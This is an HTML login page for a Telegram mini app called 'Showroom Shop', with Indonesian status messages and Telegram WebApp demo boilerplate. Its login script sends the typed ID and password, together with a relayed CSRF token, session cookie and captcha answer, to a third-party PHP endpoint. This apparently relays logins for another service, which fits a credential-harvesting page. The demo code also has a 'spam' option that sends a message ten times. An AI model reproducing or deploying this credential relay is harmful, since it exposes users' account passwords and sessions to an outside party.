<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0"> -->
    <meta name="viewport"
          content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <meta name="format-detection" content="telephone=no"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="MobileOptimized" content="176"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="robots" content="noindex,nofollow"/>
    <title>Showroom Shop - Login Page</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>

<body class="bg-gray-100 min-h-screen flex items-center justify-center">
    <div class="max-w-md w-full bg-white p-8 rounded-lg shadow-lg">
        <h2 class="text-2xl mb-4">Showroom login</h2>
        <div class="mb-4">
            <label for="username" class="block mb-1">ID:</label>
            <input type="text" id="username" name="username" class="w-full border border-gray-300 rounded px-3 py-2">
        </div>
        <div class="mb-4">
            <label for="password" class="block mb-1">Password:</label>
            <input type="password" id="password" name="password" class="w-full border border-gray-300 rounded px-3 py-2">
        </div>
        <div id="captchaContainer" class="mb-4 hidden">
            <label for="captcha" class="block mb-1">Captcha:</label>
            <input type="text" id="captcha" name="captcha" class="w-full border border-gray-300 rounded px-3 py-2">
            <img id="captchaImage" src="" alt="Captcha" class="mt-2">
        </div>
        <button onclick="login()" class="bg-blue-500 text-white px-4 py-2 rounded hover:bg-blue-600">Login</button>

        <div id="chat" class="mt-4"></div>
    </div>

    <script>
        localStorage.removeItem('csrf');
        localStorage.removeItem('srid');

        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const csrf = localStorage.getItem('csrf');
            const srid = localStorage.getItem('srid');
            const captcha = document.getElementById('captcha').value;

            axios.post('https://jnckmedia.com/newsrlogin.php',
                    `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}${csrf ? `&csrf=${encodeURIComponent(csrf)}` : ''}${srid ? `&cookie=${encodeURIComponent(srid)}` : ''}${captcha ? `&captcha=${encodeURIComponent(captcha)}` : ''}`, {
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    }
                )
                .then(function(response) {
                    if (response.data.success) {
                        const chatDiv = document.getElementById('chat');
                        chatDiv.innerHTML = `<p>Login berhasil!</p>`;

                        localStorage.removeItem('csrf');
                        localStorage.removeItem('srid');
                    } else if (response.data.error === 'captcha') {
                        const chatDiv = document.getElementById('chat');
                        chatDiv.innerHTML = `<p>Login gagal! ${response.data.error_detail}</p>`;
                        if (response.data.csrf) {
                            localStorage.setItem('csrf', response.data.csrf);
                        }
                        if (response.data.srid) {
                            localStorage.setItem('srid', response.data.srid);
                        }
                        const captchaContainer = document.getElementById('captchaContainer');
                        captchaContainer.classList.remove('hidden');
                        const captchaImage = document.getElementById('captchaImage');
                        captchaImage.src = response.data.captcha;
                    } else {
                        const chatDiv = document.getElementById('chat');
                        chatDiv.innerHTML = `<p>Login gagal! Error: ${response.data.error_detail}</p>`;

                        localStorage.removeItem('csrf');
                        localStorage.removeItem('srid');
                    }
                })
                .catch(function(error) {
                    const chatDiv = document.getElementById('chat');
                    chatDiv.innerHTML = `<p>Kesalahan: ${error.message}</p>`;
                });
        }

        const DemoApp = {
        initData      : Telegram.WebApp.initData || '',
        initDataUnsafe: Telegram.WebApp.initDataUnsafe || {},
        MainButton    : Telegram.WebApp.MainButton,

        init(options) {
            document.body.style.visibility = '';
            Telegram.WebApp.ready();
            Telegram.WebApp.MainButton.setParams({
                text      : 'CLOSE WEBVIEW',
                is_visible: true
            }).onClick(DemoApp.close);
        },
        expand() {
            Telegram.WebApp.expand();
        },
        close() {
            Telegram.WebApp.close();
        },
        toggleMainButton(el) {
            const mainButton = Telegram.WebApp.MainButton;
            if (mainButton.isVisible) {
                mainButton.hide();
                el.innerHTML = 'Show Main Button';
            } else {
                mainButton.show();
                el.innerHTML = 'Hide Main Button';
            }
        },

        // actions
        sendMessage(msg_id, with_webview) {
            if (!DemoApp.initDataUnsafe.query_id) {
                alert('WebViewQueryId not defined');
                return;
            }

            document.querySelectorAll('button').forEach((btn) => btn.disabled = true);

            const btn       = document.querySelector('#btn_status');
            btn.textContent = 'Sending...';

            DemoApp.apiRequest('sendMessage', {
                msg_id      : msg_id || '',
                with_webview: !DemoApp.initDataUnsafe.receiver && with_webview ? 1 : 0
            }, function (result) {
                document.querySelectorAll('button').forEach((btn) => btn.disabled = false);

                if (result.response) {
                    if (result.response.ok) {
                        btn.textContent   = 'Message sent successfully!';
                        btn.className     = 'ok';
                        btn.style.display = 'block';
                    } else {
                        btn.textContent   = result.response.description;
                        btn.className     = 'err';
                        btn.style.display = 'block';
                        alert(result.response.description);
                    }
                } else if (result.error) {
                    btn.textContent   = result.error;
                    btn.className     = 'err';
                    btn.style.display = 'block';
                    alert(result.error);
                } else {
                    btn.textContent   = 'Unknown error';
                    btn.className     = 'err';
                    btn.style.display = 'block';
                    alert('Unknown error');
                }
            });
        },
        checkInitData() {
            const webViewStatus = document.querySelector('#webview_data_status');
            if (DemoApp.initDataUnsafe.query_id &&
                DemoApp.initData &&
                webViewStatus.classList.contains('status_need')
            ) {
                webViewStatus.classList.remove('status_need');
                DemoApp.apiRequest('checkInitData', {}, function (result) {
                    if (result.ok) {
                        webViewStatus.textContent = 'Hash is correct (async)';
                        webViewStatus.className   = 'ok';
                    } else {
                        webViewStatus.textContent = result.error + ' (async)';
                        webViewStatus.className   = 'err';
                    }
                });
            }
        },
        sendText(spam) {
            const textField = document.querySelector('#text_field');
            const text      = textField.value;
            if (!text.length) {
                return textField.focus();
            }
            if (byteLength(text) > 4096) {
                return alert('Text is too long');
            }

            const repeat = spam ? 10 : 1;
            for (let i = 0; i < repeat; i++) {
                Telegram.WebApp.sendData(text);
            }
        },

        // Alerts
        showAlert(message) {
            Telegram.WebApp.showAlert(message);
        },
        showConfirm(message) {
            Telegram.WebApp.showConfirm(message);
        },
        isVersionAtLeast(version) {
            return Telegram.WebApp.isVersionAtLeast(version);
        },
        //version to string Example: '6.9'
        doesntSupport(version) {
            // console.log("version: " + version);
            // console.log("realVersion: " + this.version());
            // console.log("doesntSupport: " + this.isVersionAtLeast(version));
            if (!this.isVersionAtLeast(version)) {
                Telegram.WebApp.showAlert('This feature is not supported in this version of Telegram', function () {
                    Telegram.WebApp.close();
                });
                throw new Error('This feature is not supported in this version of Telegram');
            }
        },

        // Other
        apiRequest(method, data, onCallback) {
            // DISABLE BACKEND FOR FRONTEND DEMO
            // YOU CAN USE YOUR OWN REQUESTS TO YOUR OWN BACKEND
            // CHANGE THIS CODE TO YOUR OWN
            return onCallback && onCallback({error: 'This function (' + method + ') should send requests to your backend. Please, change this code to your own.'});

            const authData = DemoApp.initData || '';
            fetch('/demo/api', {
                method     : 'POST',
                body       : JSON.stringify(Object.assign(data, {
                    _auth : authData,
                    method: method,
                })),
                credentials: 'include',
                headers    : {
                    'Content-Type': 'application/json'
                }
            }).then(function (response) {
                return response.json();
            }).then(function (result) {
                onCallback && onCallback(result);
            }).catch(function (error) {
                onCallback && onCallback({error: 'Server error'});
            });
        }
    }
    </script>

</body>

</html>
